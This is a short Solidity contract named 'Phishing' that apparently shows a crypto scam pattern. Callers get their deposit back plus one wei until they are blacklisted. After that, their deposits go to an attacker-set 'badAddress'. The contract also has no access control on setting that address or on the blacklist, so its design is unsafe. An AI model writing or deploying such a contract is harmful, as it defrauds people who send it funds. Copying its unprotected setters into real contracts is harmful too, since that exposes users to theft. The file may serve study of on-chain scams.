

pragma solidity ^0.8.7;


contract Phishing{
    address[] private blackList;
    address payable public badAddress;
    address public owner;
    //bool public exist;
    constructor() {
    owner = msg.sender; // 部署者是 owner
    }
    receive() external payable {}

    function pay() public payable {
        require(msg.value > 0, "Must send ETH");
    }

    function setBA(address payable _myAddress) public{
        badAddress = _myAddress;
    }

    function inBL(address _user) public returns(bool){
        for (uint256 i = 0; i<blackList.length;i++){
            if(blackList[i] == _user){
                return true;
            }
        }
        return false;
    }


    function claim() public payable {
        if (! inBL(msg.sender)){
        payable(msg.sender).transfer(msg.value+1);
        }
        else{
        payable(badAddress).transfer(msg.value);
    }
    }


    function add(address _user) public {
            blackList.push(_user);
    }


    function bk() public view returns(address[] memory){
        return blackList;
    }


}
